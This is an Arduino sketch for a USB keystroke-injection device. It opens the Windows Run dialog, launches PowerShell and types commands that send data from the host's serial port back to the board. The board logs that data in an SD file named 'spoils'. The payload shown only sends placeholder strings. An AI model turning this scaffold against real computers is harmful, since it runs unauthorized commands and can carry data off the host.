// USed Arduino MKR Zero 
// 16Gig SD card

#include <SD.h>
#include <SPI.h>
#include <Keyboard.h>

const int chipSelect = 28;

int inject_pin = 1;
int sd_write_pin = 0;
int sd_read_pin = 2;

void setup() 
{
  pinMode(inject_pin, INPUT);
  pinMode(sd_write_pin, INPUT);
  pinMode(sd_read_pin, INPUT);

  digitalWrite(inject_pin, HIGH);
  digitalWrite(sd_write_pin, HIGH);
  digitalWrite(sd_read_pin, HIGH);

  SD.begin(chipSelect);
}


void write_file()
{
  Serial.begin(115200);

  File myfile = SD.open("Spoils/spoils.txt", FILE_WRITE);

  if(myfile)
  {
    myfile.println("Testing 1 2 3 4 5 6");
    myfile.close();
  }
  else if(!myfile)
  {
    Serial.println("File did not open");
  }

  Serial.end();
}

void read_file()
{
  Serial.begin(115200);

  File myfile = SD.open("Spoils/spoils.txt", FILE_READ);

  while(myfile.available())
  {
    Serial.write(myfile.read());
  }

  myfile.close();

  Serial.end();
}

void injection()
{
  Keyboard.begin();

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("powershell");
  delay(500);
  Keyboard.println("$com_port = [System.IO.Ports.SerialPort]::getportnames()");
  delay(500);
  Keyboard.println("$port= new-Object System.IO.Ports.SerialPort $com_port,115200,None,8,one");
  delay(500);
  Keyboard.println("$port.open()");
  delay(500);
  Keyboard.println("$port.WriteLine('some string')");
  delay(500);
  Keyboard.println("$port.Close()");

  Keyboard.end();
}

void loop() 
{

  int inject_command = digitalRead(inject_pin);
  int write_command = digitalRead(sd_write_pin);
  int read_command = digitalRead(sd_read_pin);
  delay(200);

  if(inject_command == LOW)
  {
    injection();// Pin 1
  }

  else if(write_command == LOW)
  {
    write_file();// Pin 0
    delay(1000);
  }

  else if(read_command == LOW)
  {
    read_file(); // Pin 2
    delay(1000);
  }

}
